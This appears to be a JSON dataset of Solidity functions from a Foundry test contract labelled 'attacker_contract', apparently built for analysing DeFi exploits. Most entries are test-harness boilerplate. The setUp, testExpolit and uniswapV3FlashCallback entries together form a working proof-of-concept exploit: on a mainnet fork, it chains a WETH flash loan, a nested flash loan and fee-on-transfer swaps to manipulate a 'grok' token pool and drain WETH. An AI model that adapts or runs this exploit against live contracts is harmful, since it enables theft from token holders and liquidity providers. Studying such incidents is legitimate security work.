[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_538_679 - 1);\n        cheats.label(address(weth), \"WETH\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExpolit",
    "original_code": "    function testExpolit() public {\n        emit log_named_decimal_uint(\"attaker balance before attack:\", weth.balanceOf(address(this)), weth.decimals());\n        wethpair.flash(address(this), 0, 30_000_000_000_000_000_000, new bytes(1));\n        emit log_named_decimal_uint(\"attaker balance after attack:\", weth.balanceOf(address(this)), weth.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        if (msg.sender == address(wethpair)) {\n            pair.flash(address(this), 63_433_590_767_572_373, 0, new bytes(1));\n            grok.approve(address(router_v3), grok.balanceOf(address(this)));\n            router_v3.exactInputSingle(\n                Uni_Router_V3.ExactInputSingleParams({\n                    tokenIn: address(grok),\n                    tokenOut: address(weth),\n                    fee: 10_000,\n                    recipient: address(this),\n                    deadline: block.timestamp + 100,\n                    amountIn: grok.balanceOf(address(this)),\n                    amountOutMinimum: 30 ether,\n                    sqrtPriceLimitX96: 0\n                })\n            );\n            weth.transfer(address(wethpair), 30 ether + uint256(amount1));\n        } else {\n            weth.approve(address(router_v2), type(uint256).max);\n            grok.approve(address(router_v2), type(uint256).max);\n            grok.approve(address(router_v3), type(uint256).max);\n            //first step\n            address[] memory path = new address[](2);\n            path[0] = address(grok);\n            path[1] = address(weth);\n            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                30_695_631_768_482_954, 0, path, address(this), block.timestamp + 100\n            );\n            grok.transfer(address(grok), 2_737_958_999_089_419);\n            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                30_000_000_000_000_000, 0, path, address(this), block.timestamp + 100\n            );\n            path[0] = address(weth);\n            path[1] = address(grok);\n            router_v2.swapTokensForExactTokens(\n                64_067_926_675_248_097, weth.balanceOf(address(this)), path, address(this), block.timestamp + 100\n            );\n            grok.transfer(address(pair), grok.balanceOf(address(this)));\n            //second step\n            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                30_000_000_000_000_000_000, 0, path, address(this), block.timestamp + 100\n            );\n        }\n",
    "description": ""
  }
]